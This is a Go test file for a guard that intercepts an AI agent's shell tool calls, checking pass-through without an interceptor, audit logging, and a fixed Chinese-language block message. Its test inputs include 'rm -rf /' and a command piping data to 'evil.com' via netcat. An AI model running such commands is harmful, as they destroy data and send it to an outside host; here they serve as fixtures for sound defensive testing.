package guard

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// TestSystemBlockMessagePreservedIsBrainInput 固定 systemBlockMessage 的中文原始字节。
// 该 tool_result 引导 Agent 不绕过平台拦截，ask 路径也通过 g.record 写入审计。
// 同一字符串兼作模型输入与展示，不能改变其治理语义或 framing。
func TestSystemBlockMessagePreservedIsBrainInput(t *testing.T) {
	got := systemBlockMessage("<原因>")
	want := "【ARTEX 平台管控·非目标防御】此调用被平台拦截。原因：<原因>。此操作被禁止。"
	if got != want {
		t.Errorf("systemBlockMessage 原文格式发生偏移（保留模型输入原文）：\n got %q\nwant %q", got, want)
	}
}

var _ = hook.PreToolUse
